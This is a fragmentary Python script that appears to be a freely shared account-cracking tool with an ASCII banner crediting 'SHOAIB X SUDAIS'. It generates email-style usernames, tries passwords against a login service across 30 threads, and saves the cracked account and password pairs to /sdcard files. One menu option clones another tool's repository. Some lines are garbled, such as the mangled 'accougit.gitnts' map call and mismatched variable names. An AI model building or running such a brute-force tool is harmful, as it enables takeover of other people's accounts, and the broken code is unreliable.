...
==========================
 ...
 | (___ | |__   ___   __ _ _| |__     ___   ___  

  \___ \| '_ \ / _ \ / _` | | '_ \   / _ \ / _ \ 

  ____) | | | | (_) | (_| | | |_) | | (_) | (_) |

 |_____/|_| |_|\___/ \__,_|_|_.__/   \___/ \___/ 
...
\033[1;97m Owner  : SHOAIB X SUDAIS:/
...
\033[1;97m ENJOY AND FREE 

\033[1;97m Notice : TUMHRA AWQAT NHI BETA G 
...
def Hxw_Main():
    ...
    if inpp == "4":
     ...
     os.system('cd && git clone --depth=1 https://github.com/SHOAIBKHATTAK567-404/FILE')
...
def gmail():     
        ...
        for xd in range(int(limit)):
            ...
            if '3' in lchoice:
                ...
                open('.SHOAIB ','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')

            fo = open('.SHOAIB ', 'r').read().splitlines()
...
def method():
    ...
    print(f"{oo('•')}/sdcard/SHOAIB -OK.txt")
     ...
     try:
      ...
      #      print(response.text)
            ...
            if 'session_key' in response.text:
                ...
                print('\r\033[1;92m[\033[1;97mSHOAIB -OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')

                open('/sdcard/SHOAIB -OK.txt','a').write(f'{acc} • {pword}\n')
                ...
                if cpok=='n':
                     ...
                     print('\r\033[1;91m[\033[1;97mSHOAIB -CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword+'   ')

                cpacc.append(acc)

                open('/sdcard/SHOAIB -CP.txt','a').write(f'{acc} • {pword}\n')
...
def andom():
     ...
     try:
      ...
      #      print(response.text)
            ...
            if 'session_key' in response.text:
                ...
                open('/sdcard/SHOIAB -OK.txt','a').write(f'{acc} • {pword}\n')
                ...
                if cpok=='n':
                     ...
                     print('\r\033[1;91m[\033[1;97mshoib -CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword+'   ')
    ...
    if m=='2':
        ...
        with speed(max_workers=30) as speeed:
             ...
             speede.map(start2, accougit.gitnts)
